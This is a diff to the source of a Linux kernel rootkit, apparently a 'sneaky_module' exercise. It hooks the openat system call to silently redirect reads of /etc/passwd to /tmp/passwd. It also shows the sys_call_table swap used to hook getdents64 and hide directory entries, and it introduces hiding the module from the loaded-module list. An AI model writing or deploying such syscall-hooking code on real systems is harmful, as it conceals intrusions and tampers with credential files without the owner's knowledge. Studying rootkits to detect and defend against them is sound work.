@@ -8,6 +8,11 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/fs.h>           // for file operations
+#include <linux/slab.h>         // for kmalloc and kfree
+#include <linux/uaccess.h>      // for copy_to_user and copy_from_user
+#include <linux/file.h>
+
 
 #define PREFIX "sneaky_process"
 
@@ -67,7 +72,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   // Check if the file being opened is /etc/passwd
   if (strcmp(fname, "/etc/passwd") == 0) {
     // Redirect the openat call to /tmp/passwd
-    strncpy_to_user(filename, "/tmp/passwd", sizeof("/tmp/passwd"));
+    copy_to_user(filename, "/tmp/passwd", sizeof("/tmp/passwd"));
   }
   return (*original_openat)(regs);
 }
@@ -135,14 +140,6 @@ asmlinkage int sneaky_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
   kfree(buf);
   return n_items;
 }
-
-
-// // Replace the original getdents64 syscall in the initialize_sneaky_module function
-// original_getdents64 = (void *)sys_call_table[__NR_getdents64];
-// sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
-
-// // Restore the original getdents64 syscall in the exit_sneaky_module function
-// sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
 
 // =========To hide the sneaky_module from the list of active kernel modules
 // declare a pointer to the original read system call
